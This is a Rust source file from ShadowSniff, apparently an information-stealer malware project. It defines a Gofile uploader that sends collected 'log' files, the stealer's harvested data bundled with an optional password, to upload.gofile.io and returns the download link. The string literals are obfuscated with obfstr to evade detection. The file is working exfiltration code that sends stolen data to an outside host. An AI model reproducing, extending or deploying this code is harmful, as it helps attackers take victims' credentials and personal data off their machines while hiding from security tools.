/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::external_upload::{Uploader, base_upload};
use crate::{LogFile, LogSender, SendError};
use alloc::sync::Arc;
use collector::Collector;
use delegate::delegate;
use json::parse;
use obfstr::obfstr as s;

/// https://gofile.io uploader wrapper around an inner [`LogSender`].
#[derive(Clone)]
pub struct GofileUploader<T: LogSender> {
    inner: Uploader<T>,
}

impl<T: LogSender> GofileUploader<T> {
    pub fn new(inner: T) -> Self {
        Self {
            inner: Uploader::new(s!("Gofile"), inner, upload),
        }
    }
}

fn upload(name: &str, bytes: &[u8]) -> Option<Arc<str>> {
    let response = base_upload(name, s!("https://upload.gofile.io/uploadFile"), bytes)?;

    Some(
        parse(response.body())
            .ok()?
            .get(s!("data"))?
            .get(s!("downloadPage"))?
            .as_string()?
            .clone()
            .into(),
    )
}

impl<T: LogSender> LogSender for GofileUploader<T> {
    delegate! {
        to self.inner {
            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
            where P: AsRef<str> + Clone, C: Collector;
        }
    }
}
